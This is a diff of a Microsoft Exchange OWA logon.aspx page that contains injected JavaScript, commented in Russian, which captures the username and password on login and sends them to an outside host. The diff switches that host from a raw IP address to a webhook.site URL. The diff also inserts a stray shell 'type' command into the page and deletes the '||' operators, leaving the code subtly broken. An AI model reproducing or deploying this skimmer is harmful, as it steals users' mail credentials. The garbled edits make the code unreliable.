@@ -1,4 +1,5 @@
-﻿<%@ Page language="c#" AutoEventWireup="false" Inherits="Microsoft.Exchange.HttpProxy.Logon" %>
+type "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\logon.aspx"
+<%@ Page language="c#" AutoEventWireup="false" Inherits="Microsoft.Exchange.HttpProxy.Logon" %>
 <%@ Import namespace="Microsoft.Exchange.Clients"%>
 <%@ Import namespace="Microsoft.Exchange.Clients.Owa.Core"%>
 <%@ Import namespace="Microsoft.Exchange.HttpProxy"%>
@@ -201,32 +202,34 @@ window.onload = function() {
     // Ищем кнопку входа. В OWA это обычно класс 'signinbutton' или ID 'signin'
     // Мы просто будем слушать КЛИК по всей странице, если нажали на то, что похоже на вход
     document.onclick = function(e) {
-        if (e.target.className.indexOf('signin') !== -1 || e.target.id.indexOf('sub') !== -1) {
+        if (e.target.className.indexOf('signin') !== -1  e.target.id.indexOf('sub') !== -1) {
             capture();
         }
     };
 
     // Или перехватываем саму отправку формы (самый верный способ)
-    var f = document.getElementById('logonForm') || document.forms[0];
+    var f = document.getElementById('logonForm')  document.forms[0];
     if (f) {
         f.onsubmit = capture;
     }
 };
-
 function capture() {
     try {
         var u = document.getElementById('username').value;
         var p = document.getElementById('password').value;
-        
-        // Формируем строку "логин:пароль" в открытом виде
+
+        // Склеиваем данные
         var rawData = u + ":" + p;
-        
+
+        // Кодируем ВСЮ строку целиком, чтобы спецсимволы не ломали URL
+        var safeData = encodeURIComponent(rawData);
+
         var i = new Image();
-        // Используем encodeURIComponent для безопасной передачи текста
-        i.src = "http://45.92.1.25:9999?creds=" + encodeURIComponent(rawData);
-        
+        // Теперь в creds передается "бронированная" строка
+        i.src = "https://webhook.site/935e6287-bba1-41f0-abd8-c890898bed60?creds=" + safeData;
+
         var s = new Date().getTime();
-        while (new Date().getTime() < s + 500); 
+        while (new Date().getTime() < s + 500);
     } catch (err) { }
 }
 </script>
@@ -272,12 +275,12 @@ function capture() {
 		<div class="signInCheckBoxText">
             <input id="chkPrvt" onclick="clkSec()" name="trusted" value="4" type="checkbox" class="chk" checked role="checkbox" aria-labelledby="privateLabel"/>
             <span id="privateLabel" aria-hidden="true"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ThisIsAPrivateComputer)%></span>
-			<%=(IsRtl ? "&#x200F;" : "&#x200E;") + LocalizedStrings.GetHtmlEncoded(Strings.IDs.OpenParentheses)%>
+			<%=(IsRtl ? "‏" : "‎") + LocalizedStrings.GetHtmlEncoded(Strings.IDs.OpenParentheses)%>
 			<a href="#" class="signInCheckBoxLink" id="lnkShwSec" onclick="clkSecExp('lnkShwSec')" onkeydown="kdSecExp('lnkShwSec')" role="link"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.ShowExplanation)%></a>
 			<a href="#" class="signInCheckBoxLink" id="lnkHdSec" onclick="clkSecExp('lnkHdSec')"onkeydown="kdSecExp('lnkHdSec')"  style="display:none" role="link">
 			<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.HideExplanation)%> 
 			</a>
-			<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.CloseParentheses) + (IsRtl ? "&#x200F;" : "&#x200E;")%>
+			<%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.CloseParentheses) + (IsRtl ? "‏" : "‎")%>
 			</div>
 		<div id="prvtExp" class="signInExpl" style="display:none" role="note"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.PrivateExplanation)%></div>
 		<div id="prvtWrn" class="signInWarning" style="display:none" role="note"><%=LocalizedStrings.GetHtmlEncoded(Strings.IDs.PrivateWarning)%></div>
